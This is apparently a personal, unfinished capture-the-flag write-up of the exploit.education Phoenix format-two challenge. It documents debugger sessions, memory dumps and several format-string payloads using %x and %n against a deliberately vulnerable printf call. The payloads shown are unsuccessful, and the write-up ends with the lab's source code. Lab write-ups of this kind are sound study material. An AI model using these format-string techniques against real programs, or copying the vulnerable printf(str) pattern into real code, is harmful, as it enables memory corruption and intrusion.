# Phoenix format-two
https://exploit.education/phoenix/format-two/
### Result

### Setup

### Compile code
This is a `format string` challenge using `printf`.

Like the previous challenges with `sprintf`, the compiler warns `format not a string literal and no format arguments [-Wformat-security]`.  It it referencing this code:
```
void bounce(char *str) {
  printf(str);
}
```

### Reversing
This challenge uses more C APIs than previous `format string` challenges.

```
radare2 -A format_two

[0x00400520]> ii
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x004004d0 GLOBAL FUNC       strncpy
2   0x004004e0 GLOBAL FUNC       puts
3   0x004004f0 GLOBAL FUNC       printf
4   0x00400500 GLOBAL FUNC       memset
7   0x00400510 GLOBAL FUNC       exit
```

##### Find size of buffer
If you `disassemble main` you can set `memset` is called first.

> void *memset(void *b, int c, size_t len);

If you break on that call, you can get two useful things; the address of `buffer` and the `length` of the buffer.
```
memset@plt (
   $rdi = 0x00007fffffffe440 → 0x0000000000000000,
   $rsi = 0x0000000000000000,
   $rdx = 0x0000000000000100,
   $rcx = 0x00007ffff7af4154 → 0x5477fffff0003d48 ("H="?)
)
```
The third value, the buffer length is represented in hex.  You can see the `buffer` is `256` chars long.
```
gef➤  p/d 0x100
$4 = 256
```
##### Limiting len of user input
Well, not really. But we can check another way.  The second API called is `strncpy`.  This is less famous than `strcpy` which doesn't have that `len` argument to mitigate buffer overflows:

> char * strncpy(char * dst, const char * src, size_t len);

Sidenote - the `memset` call is redundant.  As `strncpy` sets the unused memory to all zeros:

> .... strncpy() functions copy at most len characters from
> src into dst.  If src is less than len characters long, the remainder of
> dst is filled with `\0` characters.

So if we break on `strncpy`.  It was passed:
```
strncpy@plt (
   $rdi = 0x00007fffffffe440 → 0x0000000000000000,
   $rsi = 0x00007fffffffe851 → "%256xAAAAAAAAAAAAAAAA",
   $rdx = 0x0000000000000100        <-- 256 char buffer
)
```
That re-confirms the address of the buffer and it's length of `256` characters.

### Payloads
##### Blind shot
```
gef➤  run $(python -c 'print "%p" + "\x41\x41\x41\x41"')
Welcome to brought to you by https://exploit.education
0x7fffffffe860AAAABetter luck next time!
```
##### inspecting printf()
We can inject `format arguments` to try and take the `buffer` beyond `256` characters, using our user input ( which routes the input via `strncpy` ).

```
gef➤  disas bounce
0x000000000040061f <+24>:	call   0x4004f0 <printf@plt>

gef➤  b *bounce+24

printf@plt (
   $rdi = 0x00007fffffffe440 → "%256xAAAAAAAAAAAAAAAA",
   $rsi = 0x000000000000000f,
   $rdx = 0x0000000000000000
)
```
##### Create first payload
Different to the first two format string challenges, you pass in the payload this way:
```
run $(python -c 'print "%268x" + "\x41\x41\x41\x41"')
Better luck next time!
```
##### Why is Payload failing?
`memory watch 0x7fffffffe440 35 qword`
##### Before printf()
```
0x00007fffffffe440│+0x0000   0x4141417836353225   
0x00007fffffffe448│+0x0008   0x4141414141414141   
0x00007fffffffe450│+0x0010   0x0000004141414141   
0x00007fffffffe458│+0x0018   0x0000000000000000   
0x00007fffffffe460│+0x0020   0x0000000000000000   
0x00007fffffffe468│+0x0028   0x0000000000000000   
0x00007fffffffe470│+0x0030   0x0000000000000000   
0x00007fffffffe478│+0x0038   0x0000000000000000
```
##### After printf()
```
0x00007fffffffe440│+0x0000   0x4141417836353225   
0x00007fffffffe448│+0x0008   0x4141414141414141   
0x00007fffffffe450│+0x0010   0x0000004141414141   
0x00007fffffffe458│+0x0018   0x0000000000000000   
0x00007fffffffe460│+0x0020   0x0000000000000000   
0x00007fffffffe468│+0x0028   0x0000000000000000   
0x00007fffffffe470│+0x0030   0x0000000000000000   
0x00007fffffffe478│+0x0038   0x0000000000000000
```

### Failed - buffer failing to fill
I was actually only filling 104 chars in memory.  I thought I was going to be on 272 ( the stack size).

### Back to drawing board
##### the %n modifier
I had to borrow the `%n` idea from https://blog.lamarranet.com/index.php/exploit-education-phoenix-format-two-solution/.  You could copy a value into an address using `%n`.

```
#include <stdio.h>
int main() {
    int num;
    printf("AAAAAAAAA%n\n", &num);    // copies 0x9 into the address of 'num'
    return 0;
}
```

That code would not compile with default `clang`.  But you can get it to compile with `gcc` on `ubuntu`.  `gcc -g -fno-stack-protector -z execstack -no-pie -o test test.c`.

##### Set breakpoints to check memory
```
1       breakpoint     keep y   memset in main at format_two.c:21
2       breakpoint     keep y   strncpy in main at format_two.c:22
3       breakpoint     keep y   printf in bounce at format_two.c:12
4       breakpoint     keep y   exit in main at format_two.c:32
```
##### Target Buffer
`0x00007fffffffe450`
##### Little Endian Buffer
```
Python 3.8.5 (default, Sep 18 2020, 11:34:27)
>>> s="07fffffffe450"
>>> "".join(map(str.__add__, s[-2::-2] ,s[-1::-2]))
'50e4ffffff7f'
```
##### Little Endian Buffer
So I could point the buffer to it


### Understanding the user input buffer
##### Fill the 256 char buffer
`run $(python -c 'print "\x41"*256')`
##### Breakpoints
```
1       breakpoint     keep y   memset in main at format_two.c:21
2       breakpoint     keep y   strncpy in main at format_two.c:22
3       breakpoint     keep y   printf in bounce at format_two.c:12
```
##### Fill the 256 char buffer
`run $(python -c 'print "\x41"*256')`
##### Breakpoint fires
Get target memory from `memset` argument one or `p/x $rbp - 0x100`
##### Target register
`0x00007fffffffe350`
##### Watch memory
`memory watch p/x $rbp - 0x100 10 qword`
##### Print each byte
`x/256bx 0x00007fffffffe350`
##### Print only the buffer
`x/64wx 0x00007fffffffe350`
##### Get stack size
`set $stack_size = $rbp - $rsp`         # 272
##### Calculate max overflow
`p/d $stack_size -256`                  # 16
##### Print stack
`x/272wx $rsp`
##### Result
`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?@Better luck next time!`


### Finding the changeme variable
##### Get address
`nm format_two | grep changeme`
##### Read address
`0000000000601054 B changeme`
##### Reverse address
`541060`
##### Try new payload
`run $(python -c 'print "%256x" + "\x54\x10\x60")`



root@bd0657a17d54:~#
0000000000601054 B changeme
root@bd0657a17d54:~# ./format_two $(echo -e "\x54\x10\x60\x08%x%x%x%x%x%x%x%x%x%x%x%n.")
Welcome to brought to you by https://exploit.education
Segmentation fault
root@bd0657a17d54:~# ./format_two $(echo -e "\x54\x10\x60\x0%x%x%x%x%x%x%x%x%x%x%x%n.")
bash: warning: command substitution: ignored null byte in input
Welcome to brought to you by https://exploit.education
Segmentation fault
root@bd0657a17d54:~# ./format_two $(echo -e "\x54\x10\x60\x08%x%x%x%x%x%x%x%x%x%x%x%n.")
Welcome to brought to you by https://exploit.education
Segmentation fault
root@bd0657a17d54:~# ./format_two $(echo -e "\x54\x10\x60\x02%x%x%x%x%x%x%x%x%x%x%x%n.")
Welcome to brought to you by https://exploit.education
Segmentation fault
root@bd0657a17d54:~# ./format_two $(echo -e "\x54\x10\x60\x00%x%x%x%x%x%x%x%x%x%x%x%n.")
bash: warning: command substitution: ignored null byte in input















### Source code
```
 /*
 * Can you change the "changeme" variable?
 */

 #include <err.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>

 #define BANNER \
   "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

 int changeme;

 void bounce(char *str) {
   printf(str);
 }

 int main(int argc, char **argv) {
   char buf[256];

   printf("%s\n", BANNER);

   if (argc > 1) {
     memset(buf, 0, sizeof(buf));
     strncpy(buf, argv[1], sizeof(buf));
     bounce(buf);
   }

   if (changeme != 0) {
     puts("Well done, the 'changeme' variable has been changed correctly!");
   } else {
     puts("Better luck next time!\n");
   }

   exit(0);
 }
```
